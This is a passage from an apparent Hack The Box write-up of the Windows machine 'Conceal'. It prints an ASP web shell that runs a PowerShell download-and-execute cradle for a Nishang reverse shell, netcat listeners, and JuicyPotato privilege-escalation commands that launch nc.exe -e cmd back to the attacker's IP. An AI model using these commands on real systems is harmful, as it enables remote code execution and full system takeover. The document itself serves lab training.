</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/conceal-5.png></p><p>When I try to access to the shell the page display the above 404 error. If we read the page, the error is due to the extension configuration also we can see that <strong>ASP.NET</strong> is used.</p><p>As we have an extension problem, should we try to execute the shell with other <strong>ASP.NET</strong> extensions like asp.</p><p><img alt=Untitled loading=lazy src=/HTB/conceal-6.png></p><p>The shell is working now.</p><p>Now we have <strong>RCE</strong> letâ€™s send the <strong><a href=https://github.com/samratashok/nishang>Nishang</a> TCP reverse shell.</strong></p><p>We can perform it only changing the <strong>whoami</strong> command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;%
</span></span><span class=line><span class=cl>Set <span class=nv>rs</span> <span class=o>=</span> CreateObject<span class=o>(</span><span class=s2>&#34;WScript.Shell&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>Set <span class=nv>cmd</span> <span class=o>=</span> rs.Exec<span class=o>(</span><span class=s2>&#34;cmd /c powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.9/PS.ps1&#39;)&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>Response.Write<span class=o>(</span>cmd.StdOut.ReadAll<span class=o>)</span>
</span></span><span class=line><span class=cl>%&gt;
</span></span></code></pre></div><p>Basically the command we are executing download the script from a python http server which we are gonna open before where is located the <strong>Nishang</strong> script as PS.ps1</p><p>As always I am going to put <code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444</code> at the end of the <strong>Nishang</strong> script in order to execute the shell.</p><p>Now only rests to set a <strong>nc</strong> listener and let the magic happens.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4444</span>
</span></span></code></pre></div><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/conceal-7.png></p><p>We are not <strong>NT AUTHORITY\SYSTEM</strong> so we need to <strong>privEsc</strong>.</p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>First I am going to see the current privileges.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whoami /priv
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PRIVILEGES INFORMATION
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Privilege Name                Description                               <span class=nv>State</span>
</span></span><span class=line><span class=cl><span class=o>=============================</span> <span class=o>=========================================</span> <span class=o>========</span>
</span></span><span class=line><span class=cl>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
</span></span><span class=line><span class=cl>SeIncreaseQuotaPrivilege      Adjust memory quotas <span class=k>for</span> a process        Disabled
</span></span><span class=line><span class=cl>SeShutdownPrivilege           Shut down the system                      Disabled
</span></span><span class=line><span class=cl>SeAuditPrivilege              Generate security audits                  Disabled
</span></span><span class=line><span class=cl>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
</span></span><span class=line><span class=cl>SeUndockPrivilege             Remove computer from docking station      Disabled
</span></span><span class=line><span class=cl>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
</span></span><span class=line><span class=cl>SeIncreaseWorkingSetPrivilege Increase a process working <span class=nb>set</span>            Disabled
</span></span><span class=line><span class=cl>SeTimeZonePrivilege           Change the <span class=nb>time</span> zone                      Disabled
</span></span></code></pre></div><p>The <code>SeImpersonatePrivilege</code> allow us to use tools like <a href=https://github.com/ohpe/juicy-potato>JuicyPotato</a> to <strong>privEsc</strong>.</p><p>First we need to see if our system works with <strong>JuicyPotato</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>systeminfo</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>Host</span> <span class=n>Name</span><span class=err>:</span>                 <span class=n>CONCEAL</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Name</span><span class=err>:</span>                   <span class=n>Microsoft</span> <span class=n>Windows</span> <span class=mf>10</span> <span class=n>Enterprise</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Version</span><span class=err>:</span>                <span class=mf>10.0</span><span class=p>.</span><span class=py>15063</span> <span class=n>N</span><span class=p>/</span><span class=n>A</span> <span class=n>Build</span> <span class=mf>15063</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Manufacturer</span><span class=err>:</span>           <span class=n>Microsoft</span> <span class=n>Corporation</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Configuration</span><span class=err>:</span>          <span class=n>Standalone</span> <span class=n>Workstation</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Build</span> <span class=n>Type</span><span class=err>:</span>             <span class=n>Multiprocessor</span> <span class=n>Free</span>
</span></span><span class=line><span class=cl><span class=n>Registered</span> <span class=n>Owner</span><span class=err>:</span>          <span class=n>Windows</span> <span class=n>User</span>
</span></span><span class=line><span class=cl><span class=n>Registered</span> <span class=n>Organization</span><span class=err>:</span>
</span></span><span class=line><span class=cl><span class=n>Product</span> <span class=n>ID</span><span class=err>:</span>                <span class=mf>00329</span><span class=p>-</span><span class=mf>00000</span><span class=p>-</span><span class=mf>00003</span><span class=n>-AA343</span>
</span></span><span class=line><span class=cl><span class=n>Original</span> <span class=n>Install</span> <span class=n>Date</span><span class=err>:</span>     <span class=mf>12</span><span class=p>/</span><span class=mf>10</span><span class=p>/</span><span class=mf>2018</span><span class=p>,</span> <span class=mf>20</span><span class=err>:</span><span class=mf>04</span><span class=err>:</span><span class=mf>27</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Boot</span> <span class=n>Time</span><span class=err>:</span>          <span class=mf>13</span><span class=p>/</span><span class=mf>09</span><span class=p>/</span><span class=mf>2023</span><span class=p>,</span> <span class=mf>16</span><span class=err>:</span><span class=mf>35</span><span class=err>:</span><span class=mf>46</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Manufacturer</span><span class=err>:</span>       <span class=n>VMware</span><span class=p>,</span> <span class=n>Inc</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Model</span><span class=err>:</span>              <span class=n>VMware</span> <span class=n>Virtual</span> <span class=n>Platform</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Type</span><span class=err>:</span>               <span class=nb>x64-based</span> <span class=n>PC</span>
</span></span><span class=line><span class=cl><span class=n>Processor</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>              <span class=mf>1</span> <span class=n>Processor</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>Installed</span><span class=p>.</span>
</span></span><span class=line><span class=cl>                           <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=n>Intel64</span> <span class=n>Family</span> <span class=mf>6</span> <span class=n>Model</span> <span class=mf>85</span> <span class=n>Stepping</span> <span class=mf>7</span> <span class=n>GenuineIntel</span> <span class=p>~</span><span class=mf>2295</span> <span class=n>Mhz</span>
</span></span><span class=line><span class=cl><span class=n>BIOS</span> <span class=n>Version</span><span class=err>:</span>              <span class=n>Phoenix</span> <span class=n>Technologies</span> <span class=n>LTD</span> <span class=mf>6.00</span><span class=p>,</span> <span class=mf>12</span><span class=p>/</span><span class=mf>12</span><span class=p>/</span><span class=mf>2018</span>
</span></span><span class=line><span class=cl><span class=n>Windows</span> <span class=n>Directory</span><span class=err>:</span>         <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Directory</span><span class=err>:</span>          <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>system32</span>
</span></span><span class=line><span class=cl><span class=n>Boot</span> <span class=n>Device</span><span class=err>:</span>               <span class=p>\</span><span class=n>Device</span><span class=p>\</span><span class=n>HarddiskVolume1</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Locale</span><span class=err>:</span>             <span class=nb>en-gb</span><span class=p>;</span><span class=n>English</span> <span class=p>(</span><span class=n>United</span> <span class=n>Kingdom</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Input</span> <span class=n>Locale</span><span class=err>:</span>              <span class=nb>en-gb</span><span class=p>;</span><span class=n>English</span> <span class=p>(</span><span class=n>United</span> <span class=n>Kingdom</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Time</span> <span class=n>Zone</span><span class=err>:</span>                 <span class=p>(</span><span class=n>UTC</span><span class=p>+</span><span class=mf>00</span><span class=err>:</span><span class=mf>00</span><span class=p>)</span> <span class=n>Dublin</span><span class=p>,</span> <span class=n>Edinburgh</span><span class=p>,</span> <span class=n>Lisbon</span><span class=p>,</span> <span class=n>London</span>
</span></span><span class=line><span class=cl><span class=n>Total</span> <span class=n>Physical</span> <span class=n>Memory</span><span class=err>:</span>     <span class=mf>2</span><span class=p>,</span><span class=mf>047</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Available</span> <span class=n>Physical</span> <span class=n>Memory</span><span class=err>:</span> <span class=mf>1</span><span class=p>,</span><span class=mf>164</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=n>Max</span> <span class=n>Size</span><span class=err>:</span>  <span class=mf>3</span><span class=p>,</span><span class=mf>199</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=n>Available</span><span class=err>:</span> <span class=mf>2</span><span class=p>,</span><span class=mf>253</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=k>In</span> <span class=n>Use</span><span class=err>:</span>    <span class=mf>946</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Page</span> <span class=n>File</span> <span class=n>Location</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>     <span class=n>C:</span><span class=p>\</span><span class=n>pagefile</span><span class=p>.</span><span class=py>sys</span>
</span></span><span class=line><span class=cl><span class=n>Domain</span><span class=err>:</span>                    <span class=n>WORKGROUP</span>
</span></span><span class=line><span class=cl><span class=n>Logon</span> <span class=n>Server</span><span class=err>:</span>              <span class=n>N</span><span class=p>/</span><span class=n>A</span>
</span></span><span class=line><span class=cl><span class=n>Hotfix</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>                 <span class=n>N</span><span class=p>/</span><span class=n>A</span>
</span></span><span class=line><span class=cl><span class=n>Network</span> <span class=n>Card</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>           <span class=mf>1</span> <span class=n>NIC</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>Installed</span><span class=p>.</span>
</span></span><span class=line><span class=cl>                           <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=n>vmxnet3</span> <span class=n>Ethernet</span> <span class=n>Adapter</span>
</span></span><span class=line><span class=cl>                                 <span class=n>Connection</span> <span class=n>Name</span><span class=err>:</span> <span class=n>Ethernet0</span> <span class=mf>2</span>
</span></span><span class=line><span class=cl>                                 <span class=n>DHCP</span> <span class=n>Enabled</span><span class=err>:</span>    <span class=n>No</span>
</span></span><span class=line><span class=cl>                                 <span class=n>IP</span> <span class=n>address</span><span class=p>(</span><span class=n>es</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                 <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=py>116</span>
</span></span><span class=line><span class=cl>                                 <span class=p>[</span><span class=mf>02</span><span class=p>]</span><span class=err>:</span> <span class=n>fe80</span><span class=p>::</span><span class=mf>1031</span><span class=err>:</span><span class=n>d377</span><span class=err>:</span><span class=n>eff5</span><span class=err>:</span><span class=n>6cba</span>
</span></span><span class=line><span class=cl>                                 <span class=p>[</span><span class=mf>03</span><span class=p>]</span><span class=err>:</span> <span class=n>dead</span><span class=err>:</span><span class=n>beef</span><span class=p>::</span><span class=n>c888</span><span class=err>:</span><span class=mf>9715</span><span class=err>:</span><span class=n>2be0</span><span class=err>:</span><span class=n>f364</span>
</span></span><span class=line><span class=cl>                                 <span class=p>[</span><span class=mf>04</span><span class=p>]</span><span class=err>:</span> <span class=n>dead</span><span class=err>:</span><span class=n>beef</span><span class=p>::</span><span class=mf>1031</span><span class=err>:</span><span class=n>d377</span><span class=err>:</span><span class=n>eff5</span><span class=err>:</span><span class=n>6cba</span>
</span></span><span class=line><span class=cl>                                 <span class=p>[</span><span class=mf>05</span><span class=p>]</span><span class=err>:</span> <span class=n>dead</span><span class=err>:</span><span class=n>beef</span><span class=p>::</span><span class=mf>248</span>
</span></span><span class=line><span class=cl><span class=nb>Hyper-V</span> <span class=n>Requirements</span><span class=err>:</span>      <span class=n>A</span> <span class=n>hypervisor</span> <span class=n>has</span> <span class=n>been</span> <span class=n>detected</span><span class=p>.</span> <span class=n>Features</span> <span class=n>required</span> <span class=k>for</span> <span class=nb>Hyper-V</span> <span class=n>will</span> <span class=n>not</span> <span class=n>be</span> <span class=n>displayed</span><span class=p>.</span>
</span></span></code></pre></div><p>The current version is vulnerable so I copied the <strong>JuicyPotato</strong> binary with <strong>smbserver.py</strong> in order to execute it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>smbserver</span><span class=p>.</span><span class=py>py</span> <span class=n>smbFolder</span> <span class=vm>$</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span> <span class=n>-smb2support</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>copy </span><span class=p>\\</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>9</span><span class=p>\</span><span class=n>smbFolder</span><span class=p>\</span><span class=n>JuicyPotato</span><span class=p>.</span><span class=py>exe</span> <span class=p>.</span>
</span></span></code></pre></div><p>Once copied I have executed it with the following arguments.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.\</span><span class=n>JuicyPotato</span><span class=p>.</span><span class=py>exe</span> <span class=n>-t</span> <span class=p>*</span> <span class=n>-p</span> <span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>System32</span><span class=p>\</span><span class=n>cmd</span><span class=p>.</span><span class=py>exe</span> <span class=n>-l</span> <span class=mf>1338</span> <span class=n>-a</span> <span class=s2>&#34;/c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 4445&#34;</span>
</span></span></code></pre></div><p>With a <strong>smbserver</strong> on the <strong>nc.exe</strong> binary and setting a <strong>nc</strong> listener on our local machine, we are able to do a reverse shell as <strong>root</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>nc</span> <span class=n>-lv</span> <span class=mf>4445</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/conceal-8.png></p><p>We have had a <strong>CLSID</strong> testing error.</p><p>Googling I found a <a href=https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/>post</a> with a bunch of valid <strong>CLSID</strong> for <strong>JuicyPotato</strong>.</p><p>I start testing with wuauserv which probably be enabled</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.<span class=se>\J</span>uicyPotato.exe -t * -p <span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>md.exe -l <span class=m>1338</span> -a <span class=s2>&#34;/c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 4445&#34;</span> -c <span class=s1>&#39;{e60687f7-01a1-40aa-86ac-db1cbf673334}&#39;</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/conceal-9.png></p><p>We pwnd Conceal ðŸ‘½.</p><h2 id=flags>Flag(s)<a hidden class=anchor aria-hidden=true href=#flags>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/conceal-10.png></p><p><img alt=Untitled loading=lazy src=/HTB/conceal-11.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/privesc/>Privesc</a></li><li><a href=https://pwndside.github.io/tags/web/>Web</a></li><li><a href=https://pwndside.github.io/tags/windows/>Windows</a></li><li><a href=https://pwndside.github.io/tags/ftp/>Ftp</a></li><li><a href=https://pwndside.github.io/tags/snmp/>Snmp</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://pwndside.github.io/>PwndSide</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>